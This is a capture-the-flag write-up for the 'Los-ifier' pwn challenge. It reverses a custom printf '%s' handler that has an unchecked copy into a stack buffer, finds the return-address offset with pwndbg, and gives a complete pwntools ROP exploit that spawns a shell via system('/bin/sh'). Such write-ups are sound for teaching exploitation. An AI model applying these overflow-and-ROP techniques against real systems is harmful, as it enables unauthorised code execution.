# Los-ifier
![Challenge](losifier_chall.png){: w="500" h="500" }

## Initial Analysis
We are given a binary and Dockerfile. The binary is statically linked, meaning that it contains functions that usually are located in libc (dynamically linked).
```console
loevland@hp-envy:~/ctf/glacier/pwn/Losifier$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=d0603ba281b2372084e4f2a9250bd5b79e916b91, for GNU/Linux 4.4.0, not stripped
```

The binary has no PIE, so we know the addresses of all the functions, but NX and Canary is both enabled.
```console
loevland@hp-envy:~/ctf/glacier/pwn/Losifier$ pwn checksec chall
[*] '/home/loevland/ctf/glacier/pwn/Losifier/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Running the binary, it asks us for some input, and prints our input + `-> Los` prepended.
```console
loevland@hp-envy:~/ctf/glacier/pwn/Losifier$ ./chall
test
-> Lostest
```

Reversing the binary we find the following `main` function
```c
int __fastcall main(int argc, const char **argv, const char **envp){
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  char v8[256]; // [rsp+0h] [rbp-100h] BYREF

  setup();
  fgets(v8, 256LL, stdin);
  printf((unsigned int)"-> %s\n", (unsigned int)v8, v3, v4, v5, v6, v8[0]);
  return 0;
}
```
{: .nolineno }

We can see that 256 bytes of input is read into a buffer of the same size, and that the buffer is printed with `-> ` in front (note that we don't see where `Los` is prepended).

As this main function does not look particulary vulnerable we look at what happens in the `setup` function.
```c
__int64 setup(){
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  return register_printf_specifier('s', (__int64)printf_handler, (__int64)printf_arginfo_size);
}
```
{: .nolineno }

The first two lines are normal setup for buffering in pwn-challenges, but the `register_printf_specifier` function is not usually seen. [This function](https://man7.org/linux/man-pages/man3/printf.h.3head.html) lets the developer create custom format string specifiers. The first argument to the function is the character representing the new specifier (in this case it is `s`, so the custom format string specifier is used when `%s` occurs in the printf call). The second argument is a function which handles the actual printing for the specifier(defines the behavior), and the third argument is a function defining the size of the arginfo (we don't care about this in this challenge, but we know it exists).

Looking at the custom function, `printf_handler`, we see the following code (cleaned up a little) that redfines the behavior of the `%s` format string specifier.
```c
__int64 __fastcall printf_handler(FILE *stdout, __int64 not_used, unsigned __int8 ***printf_content){
  char buffer[64]; // [rsp+20h] [rbp-50h] BYREF
  __int64 buf_len; // [rsp+60h] [rbp-10h]
  unsigned __int8 *printf_string; // [rsp+68h] [rbp-8h]

  memset(buffer, 0, sizeof(buffer));
  printf_string = **printf_content;
  qmemcpy(buffer, "Los", 3);
  loscopy((unsigned __int8 *)&buffer[3], printf_string, '\n');
  buf_len = j_strlen_ifunc((__int64)buffer);
  fwrite(buffer, 1LL, buf_len, stdout);
  return buf_len;
}

__int64 __fastcall loscopy(unsigned __int8 *curr_char, unsigned __int8 *a2, char newline){
  unsigned __int8 *v3; // rdx
  unsigned __int8 *v4; // rax
  __int64 result; // rax

  while ( 1 ){
    result = *a2;
    if ( newline == (_BYTE)result )
      break;
    v3 = a2++;
    v4 = curr_char++;
    *v4 = *v3;
  }
  return result;
}
```
{: .nolineno }

The `printf_handler` function zeros out a buffer allocated on the stack, and adds `Los` as the first bytes in the buffer. Then the `loscopy` function is called, which copies the our input string to the next indices in the buffer (essentially just prepending `Los` to our input), until a newline character is found. Then the new length of the buffer is stored, and the buffer is written to stdout (which is what we see printed after supplying our input when running the binary).

Two things should be noted from the analysis:
- The `loscopy` function copies the bytes from our input until it reaches a newline, without any boundary check, allowing for a buffer overflow
- Looking at the assembly code of the reversed functions, there is no canary protecting against a buffer overflow (other functions might have the canary protection, but not the ones we've reversed)

This means that we can overflow the buffer `loscopy` copies our input into, and call `system("/bin/sh")` to get a shell (since there is no `win` function) by overwriting the return address on the stack with it.

## Finding the Offset
Finding the offset is mostly straightforward (we will go over the not so straightforward case as well). We know the buffer that is being copied into is approximately 64 bytes (should be 64, but the function is not 100% cleaned up), so we need some more bytes than 64 to overflow the return address on the stack, for example 100 bytes.
If we supply a cyclic pattern of 100 bytes the program crashes at the following instruction (seen in *pwndbg*):
```
► 0x4018fe <printf_handler+185>    ret    <0x616161616c616161>
```

This gives us an offset of 85 (the offset is actually 88, because it has to be aligned with 8 bytes, but *Los* is prepended to our input, making the offset 3 bytes shorter).
```console
pwndbg> cyclic -l 0x616161616c616161
Finding cyclic pattern of 8 bytes: b'aaalaaaa' (hex: 0x6161616c61616161)
Found at offset 85
```

The not so straightforward way occurs when we supply an input which is too large, and instead of having the program crash at the `ret` instruction, it instead crashes inside the `fwrite` function. This is because when `fwrite` is called in `printf_handler`, we can overwrite the fourth argument to `fwrite`, which is some value indicating where the output of *fwrite* should be written (in our case stdout). If we overwrite this value, which we do by supplying more than 141 bytes, `fwrite` will most likely crash due to not being able to dereference the address.

The following is an example where we have overwritten this value on the stack.
```console
 ► 0x4018f4 <printf_handler+175>        call   fwrite                      <fwrite>
        ptr: 0x7fffffffcd00 ◂— 0x6161616161736f4c ('Losaaaaa')
        size: 0x1
        n: 0xcb
        s: 0x7fffffffcd90 ◂— 'aaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
```

If we write 141 bytes or less we are just short of touching this stack value, and the program crashes as expected on the `ret` instruction later on.
```console
 ► 0x4018f4 <printf_handler+175>        call   fwrite                      <fwrite>
        ptr: 0x7fffffffcd00 ◂— 0x61736f4c /* 'Losa' */
        size: 0x1
        n: 0x4
        s: 0x7fffffffcd90 ◂— 0xfbad8000
```

If we crash in the `fwrite` function, it is still possible to find the offset to the return address, because we have still overwritten the return address on the stack. Looking at the `backtrace` in `pwndbg` (in the bottom of the debug-window) we can see the current address we are on (index 0), the return address of the current stack frame (which is where we return back to `printf_handler`), and where we return to after the function `printf_handler` has returned (index 2: 0x616161616c616161, which is the return address)
```console
 ► 0         0x409c3d fwrite+77
   1         0x4018f9 printf_handler+180
   2 0x616161616c616161
   3 0x616161616d616161
   4 0x616161616e616161
   5 0x616161616f616161
   6 0x6161616170616161
   7 0x6161616171616161
```

This gives us the same offset as the first method where we supplied less than 141 bytes of input
```console
pwndbg> cyclic -l 0x616161616c616161
Finding cyclic pattern of 8 bytes: b'aaalaaaa' (hex: 0x6161616c61616161)
Found at offset 85
```


## Creating the Exploit
We have found our offset to be `85`, and can then overwrite the return address on the stack with `system("/bin/sh")` to get a shell (because PIE is disabled, and the binary is statically linked, we don't need a libc leak to find the address of *system*).
```python
rop = ROP(exe)                               # Create ROP payload
rop.raw(b"A"*85)                             # Offset
rop.system(next(exe.search(b"/bin/sh\x00"))) # system("/bin/sh")
```
{: .nolineno}

This payload will however not work, because of a [stack alignment/MOVAPS](https://ropemporium.com/guide.html#) issue, so we need to add 8 bytes before we call *system*.
```console
loevland@hp-envy:~/ctf/glacier/pwn/Losifier$ python3 exploit.py
[+] Opening connection to chall.glacierctf.com on port 13392: Done
[*] Loaded 133 cached gadgets for './chall'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```

We use a `ret` instruction for this, as is essentially works as a `nop` instruction, and does nothing to our payload (other than aligning the stack before we call *system*).
```python
rop = ROP(exe)                               # Create ROP payload
rop.raw(b"A"*85)                             # Offset
rop.raw(rop.ret.address)                     # Stack alignment
rop.system(next(exe.search(b"/bin/sh\x00"))) # system("/bin/sh")
```

The full exploit script then ends up as the following.
```python
from pwn import *

exe = context.binary = ELF("./chall", checksec=False)
# io = process(exe.path)
io = remote("chall.glacierctf.com", 13392)

rop = ROP(exe)                               # Create ROP payload
rop.raw(b"A"*85)                             # Offset
rop.raw(rop.ret.address)                     # Stack alignment
rop.system(next(exe.search(b"/bin/sh\x00"))) # system("/bin/sh")

io.sendline(rop.chain())
io.interactive()
```
